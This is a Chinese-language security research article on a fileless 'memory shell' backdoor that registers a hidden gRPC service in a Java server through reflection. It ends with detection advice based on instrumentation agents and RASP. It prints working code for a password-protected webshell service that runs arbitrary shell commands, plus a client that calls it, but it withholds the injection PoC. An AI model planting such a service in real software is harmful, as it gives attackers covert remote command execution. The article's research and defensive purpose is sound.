## ****一、概述****

在【内存马的攻防博弈之旅】中，我们对内存马做过了一定的介绍。做个简单的总结，内存马就是在系统动态创建对外提供服务的恶意后门接口，并且整个过程没有文件落地，全都在内存中执行，故称之为内存马。

目前已经有基于Filter，servlet，service，websocket等方式实现的内存马。本文将介绍利用gRPC协议的新型的内存马的实现与防御。

##  ** **二、gRPC****

gRPC[1]是由 google开发的一个高性能、通用的开源RPC框架，主要面向移动应用开发且基于HTTP/2协议标准而设计，同时支持大多数流行的编程语言。

官方对gRPC协议的介绍如下：

gRPC 是一种开源高性能远程过程调用 (RPC)
框架，可以在任何环境中运行。它可以通过对负载平衡、跟踪、健康检查和身份验证的可插拔支持，有效地连接数据中心内和数据中心之间的服务。它还适用于分布式计算的最后一英里，将设备、移动应用程序和浏览器连接到后端服务。

gRPC协议有着以下的特性：

  1. 简单的服务定义  
使用 Protocol Buffers 定义您的服务，这是一种强大的二进制序列化工具集和语言。

  2. 快速启动并扩展  
使用一行代码安装运行时和开发环境，并使用框架扩展到每秒数百万次 RPC。

  3. 跨语言和平台工作  
以各种语言和平台为您的服务自动生成惯用的客户端和服务器存根。

  4. 双向流和集成身份验证  
双向流和完全集成的可插拔身份验证与基于 HTTP/2 的传输。

gRPC以其高效的性能，在现在微服务架构中越来越流行。既然gRPC协议就是一种对外提供服务的接口，那是否也可以通过gRPC协议来实现一种新型的内存马呢？

##  ** **三、gRPC环境搭建****

 **3.1 环境搭建**

首先，我们使用java maven环境搭建一个gRPC服务。

完整代码在https://github.com/snailll/gRPCDemo。

创建一个简单User服务，gRPC基于ProtoBuf(Protocol Buffers) [2]序列化协议开发，我们需要先定义user.proto

syntax = “proto3”;  
package protocol;

option go_package = “protocol”;  
option java_multiple_files = true;  
option java_package = “com.demo.shell.protocol”;

message User {  
int32 userId = 1;  
string username = 2;  
sint32 age = 3;  
string name = 4;  
}

service UserService {  
rpc getUser (User) returns (User) {}  
rpc getUsers (User) returns (stream User) {}  
rpc saveUsers (stream User) returns (User) {}  
}

  

再实现对应UserService里的方法

public class UserServiceImpl extends UserServiceGrpc.UserServiceImplBase {  
@Override  
public void getUser(User request, StreamObserver<User> responseObserver) {  
System.out.println(request);  
…  
responseObserver.onNext(user);  
responseObserver.onCompleted();  
}

@Override  
public void getUsers(User request, StreamObserver<User> responseObserver) {  
…  
responseObserver.onNext(user);  
responseObserver.onNext(user2);

responseObserver.onCompleted();  
}

@Override  
public StreamObserver<User> saveUsers(StreamObserver<User> responseObserver) {

return new StreamObserver<User>() {  
…  
};  
}  
}

  

启动服务

  
public class NsServer {  
public static void main(String[] args) throws Exception {  
int port = 8082;  
Server server = ServerBuilder  
.forPort(port)  
.addService(new UserServiceImpl())  
.build()  
.start();  
System.out.println(“server started, port : ” + port);  
server.awaitTermination();  
}  
}

  

启动客户端

public class NsTest {  
public static void main(String[] args) {User user = User.newBuilder()  
.setUserId(100)  
.build();String host = “127.0.0.1”;  
int port = 8082;  
ManagedChannel channel = ManagedChannelBuilder.forAddress(host,
port).usePlaintext().build();  
UserServiceGrpc.UserServiceBlockingStub userServiceBlockingStub =
UserServiceGrpc.newBlockingStub(channel);  
User responseUser = userServiceBlockingStub.getUser(user);  
System.out.println(responseUser);

  

Iterator<User> users = userServiceBlockingStub.getUsers(user);  
while (users.hasNext()) {  
System.out.println(users.next());  
}

channel.shutdown();  
}  
}  
  
---  
  
##  ** **四、内存马实现方式****

 **4.1 实现原理**

需要实现内存马，我们就需要能够动态创建对外提供服务的恶意后门接口，通过上面的环境搭建步骤我们可以看到，添加服务是Server的addService方法实现的，那我们就以此为入口，分析服务是如何添加以及运行的，来实现后续的动态添加service实现内存马的能力。

 **4.2 关键逻辑分析**

![](https://image.3001.net/images/20221208/1670470615_63915bd79d60790d1f34f.png!small)

图1 gRPC方法请求流程及动态注入

通过分析服务解析调用的流程，整个gRPC服务的注册及调用流程如图1所示：

  1. 启动时创建services列表，添加所有的gRPC的接口的定义，并设置为unmodifiable；
  2. 请求时判断调用的接口是否在接口列表中，在列表中就调用对应的实现类。

通过分析server创建以及请求调用的过程，可以得出，如果想要实现动态注入gRPC service，那我们需要满足以下条件：

  1. 能获取到获取到services列表；
  2. 能创建自定义的service接口；
  3. 能够对unmodifiable的接口做修改，加入创建的service接口

通过分析，在gRPC调用链中，我们可以看到一个参数里面的services，methods也正是我们注册的User服务。通过java的反射机制，就可以获取到此属性。

![](https://image.3001.net/images/20221208/1670470628_63915be4cd9c1d1595970.png!small)

图2请求中的services对象

对于已经设置为unmodifiable的services对象，往里面直接put元素会抛出异常。因此我们采取一种讨巧的方式，创建一个新的可以修改的对象，将原始内容添加进去，并加入我们需要新加入的Service，最后反射set为新创建的值。

 **4.3 利用构造**

通过java反序列化等漏洞我们可以利用java的反射机制实现动态注入接口，修改services对象注入内存马接口，因为PoC包含攻击性暂不提供。
内存马的简单内容实现如下：

webshell.proto定义：

syntax = “proto3”;  
package protocol;

option go_package = “protocol”;  
option java_multiple_files = true;  
option java_package = “com.demo.shell.protocol”;

message Webshell {

string pwd = 1;  
string cmd = 2;  
}

service WebShellService {  
rpc exec (Webshell) returns (Webshell) {}  
}

webshell实现类：

public class WebshellServiceImpl extends
WebShellServiceGrpc.WebShellServiceImplBase {

@Override  
public void exec(Webshell request, StreamObserver<Webshell> responseObserver)
{  
super.exec(request, responseObserver);  
String pwd = request.getPwd();  
String cmd = request.getCmd();

if (“x”.equals(pwd)) {  
String[] cmdStrings = new String[]{“sh”, “-c”, cmd};  
String retString = “”;

Process p = null;  
try {  
p = Runtime.getRuntime().exec(cmdStrings);  
int status = p.waitFor();  
List<String> processList = new ArrayList<String>();

BufferedReader input = new BufferedReader(new
InputStreamReader(p.getInputStream()));  
String line = “”;  
while ((line = input.readLine()) != null) {  
processList.add(line);  
}  
input.close();

for (String l : processList) {  
line += l;  
}  
System.out.println(line);

// String result = p.getOutputStream().toString();  
System.out.println(“=======>” + line);  
if (status != 0) {  
System.err.println(String.format(“runShellCommand: %s, status: %s”, cmd,  
status));  
}

Webshell webshell = Webshell  
.newBuilder().setCmd(line).build();  
responseObserver.onNext(webshell);  
responseObserver.onCompleted();  
} catch (Exception e) {  
e.printStackTrace();  
} finally {  
if (p != null) {  
p.destroy();  
}  
}  
}  
}  
}

 **4.4 利用效果**

默认未执行payload前Service只有一个。

![](https://image.3001.net/images/20221208/1670470646_63915bf699ce8d0aca5c5.png!small)

图3 未执行内存马前的service对象列表

执行User的getUser方法后触发payload添加 Service后，webshell Service 已经成功注册。

![](https://image.3001.net/images/20221208/1670470660_63915c04571cf3875aa24.png!small)

图4 执行内存马后的service对象列表

client连接webshell，执行命令

public class TestShell {  
public static void main(String[] args) {

Webshell webshell = Webshell.newBuilder()  
.setPwd(“x”)  
.setCmd(“ls -al “)  
.build();

String host = “127.0.0.1”;  
int port = 8082;  
ManagedChannel channel = ManagedChannelBuilder.forAddress(host,
port).usePlaintext().build();

WebShellServiceGrpc.WebShellServiceBlockingStub webShellServiceBlockingStub =
WebShellServiceGrpc.newBlockingStub(channel);  
Webshell s = webShellServiceBlockingStub.exec(webshell);  
System.out.println(s.getCmd());  
try {  
Thread.sleep(5000);  
} catch (InterruptedException e) {  
e.printStackTrace();  
}  
channel.shutdown();  
}  
}

可以看到server已经成功执行命令，输出结果。

![](https://image.3001.net/images/20221208/1670470676_63915c14153ee404d92fd.png!small)

图5 内存马执行命令成功结果

##  ** **五、防御手段****

目前内存马的检测手段主要有两种方式，一种是利用基于Instrument的Agent的事后检测机制，一种是利用RASP的事中检测机制。

传统的利用Instrument的Agent检测机制是对已存在的Servlet，Filter，Listener，Interceptor，websocket对象的class文件反编译后再做恶意代码识别。但gRPC类型的内存马并不在这个列表中，因此是无法检测的。对gRPC类型的内存马，可以加入对实现了io.grpc.BindableService接口的类做检测。

利用RASP技术，可以对动态修改services列表的行为做检测阻断，以实现阻止gRPC内存马的创建。

##  ** **六、总结****

本文介绍了在新的微服务的场景，随着gRPC协议的广泛应用，利用gRPC实现的新型的内存马技术也给企业的安全防护带来了新的挑战。同时随着技术的不断的迭代发展，也有可能会有其他新型的内存马的出现。可以看出内存马安全攻防的博弈一直都在持续进行中，这趟旅程还没有到终点。

### 参考链接

  * [https://grpc.io](https://grpc.io/)
  * https://developers.google.com/protocol-buffers

